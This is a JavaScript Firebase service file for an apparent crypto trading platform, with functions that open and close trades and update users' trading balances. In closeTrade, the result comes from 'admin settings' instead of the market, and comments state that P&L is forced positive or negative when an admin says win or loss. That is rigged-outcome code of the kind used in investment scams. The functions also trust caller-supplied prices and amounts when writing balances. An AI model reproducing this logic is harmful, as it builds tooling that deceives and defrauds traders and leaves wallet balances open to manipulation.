// src/services/tradeService.js
import { db } from "../firebase";
import { doc, getDoc, updateDoc, collection, addDoc, runTransaction, serverTimestamp } from "firebase/firestore";
import { determineTradeOutcome } from "./tradeSettingsService";

/**
 * Open a new trade - deducts investment from user trading balance
 */
export const openTrade = async (uid, tradeData) => {
    try {
        return await runTransaction(db, async (transaction) => {
            const walletRef = doc(db, "wallets", uid);
            const walletSnap = await transaction.get(walletRef);

            if (!walletSnap.exists()) {
                throw new Error("Wallet not found");
            }

            const walletData = walletSnap.data();
            // Fallback for migration: if tradingBalance doesn't exist, it's 0. 
            // The old 'balance' field is considered 'mainBalance'.
            const tradingBalance = walletData.tradingBalance !== undefined ? walletData.tradingBalance : 0;

            if (tradingBalance < tradeData.amount) {
                throw new Error("Insufficient trading balance");
            }

            // Create trade record
            const tradeRecord = {
                uid,
                type: tradeData.type || 'delivery',
                asset: tradeData.coin.symbol,
                assetName: tradeData.coin.name,
                side: tradeData.side,
                amount: tradeData.amount,
                entryPrice: tradeData.entryPrice,
                leverage: tradeData.leverage || 1,
                profitPercent: tradeData.profitPercent || 0,
                duration: tradeData.duration || null,
                status: "active",
                createdAt: serverTimestamp(),
            };

            // Only Delivery trades have an expiration
            if (tradeData.type === 'delivery') {
                tradeRecord.expiresAt = new Date(Date.now() + parseDuration(tradeData.duration) * 1000);
            }

            const tradeRef = doc(collection(db, "trades"));
            transaction.set(tradeRef, tradeRecord);

            // Deduct investment from trading balance
            transaction.update(walletRef, {
                tradingBalance: tradingBalance - tradeData.amount,
                updatedAt: serverTimestamp()
            });

            return {
                success: true,
                tradeId: tradeRef.id,
                newTradingBalance: tradingBalance - tradeData.amount
            };
        });
    } catch (error) {
        console.error("Error opening trade:", error);
        throw error;
    }
};

/**
 * Close a trade - adds profit/loss to user trading balance
 */
export const closeTrade = async (tradeId, uid, side, entryPrice, currentPrice, amount, profitPercent, type = 'delivery', leverage = 1) => {
    try {
        // Determine outcome based on admin settings
        const outcome = await determineTradeOutcome(uid, side, entryPrice, currentPrice, type);

        let pnl;
        if (type === 'perpetual') {
            // Leverage based P&L: ((Current - Entry) / Entry) * Amount * Leverage
            const priceDeltaPercent = (currentPrice - entryPrice) / entryPrice;
            pnl = priceDeltaPercent * amount * leverage * (side === "buy" ? 1 : -1);

            // Admin Override Handling
            if (outcome === "win" && pnl < 0) pnl = Math.abs(pnl) || (amount * 0.1); // Force positive if admin says win
            if (outcome === "loss" && pnl > 0) pnl = -Math.abs(pnl) || -(amount * 0.1); // Force negative if admin says loss
        } else {
            // Binary (Delivery) logic
            pnl = outcome === "win"
                ? amount * (profitPercent / 100)
                : -amount;
        }

        return await runTransaction(db, async (transaction) => {
            const walletRef = doc(db, "wallets", uid);
            const walletSnap = await transaction.get(walletRef);

            if (!walletSnap.exists()) {
                throw new Error("Wallet not found");
            }

            const walletData = walletSnap.data();
            const tradingBalance = walletData.tradingBalance !== undefined ? walletData.tradingBalance : 0;

            let returnAmount;
            if (type === 'perpetual') {
                // Return original Margin + P&L
                returnAmount = amount + pnl;
            } else {
                // If win: return investment + profit. If loss: 0
                returnAmount = outcome === "win" ? (amount + pnl) : 0;
            }

            // Prevent balance from going negative below zero
            const finalReturn = Math.max(0, returnAmount);

            transaction.update(walletRef, {
                tradingBalance: tradingBalance + finalReturn,
                updatedAt: serverTimestamp()
            });

            // Update trade record
            const tradeRef = doc(db, "trades", tradeId);
            transaction.update(tradeRef, {
                status: "closed",
                result: type === 'perpetual' ? (pnl >= 0 ? "win" : "loss") : outcome,
                pnl,
                exitPrice: currentPrice,
                closedAt: serverTimestamp()
            });

            return {
                success: true,
                outcome: type === 'perpetual' ? (pnl >= 0 ? "win" : "loss") : outcome,
                pnl,
                newTradingBalance: tradingBalance + finalReturn
            };
        });
    } catch (error) {
        console.error("Error closing trade:", error);
        throw error;
    }
};

/**
 * Parse duration string to seconds
 */
function parseDuration(dur) {
    if (dur.endsWith("s")) return parseInt(dur);
    if (dur.endsWith("m")) return parseInt(dur) * 60;
    return 60;
}
